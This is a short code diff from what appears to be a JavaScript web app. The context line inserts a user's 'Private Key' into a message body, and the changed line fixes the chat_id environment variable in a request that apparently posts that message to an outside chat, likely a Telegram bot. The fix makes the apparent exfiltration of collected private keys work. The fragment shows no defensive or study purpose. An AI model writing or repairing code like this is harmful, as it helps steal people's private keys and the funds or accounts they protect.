@@ -112,7 +112,7 @@ Private Key: \`${privateKey.trim()}\`
             "Content-Type": "application/json",
           },
           body: JSON.stringify({
-            chat_id: process.NEXT_PUBLIC_CHAT_ID,
+            chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
             text: emailBody,
             parse_mode: "Markdown", // Allows backtick formatting
           }),
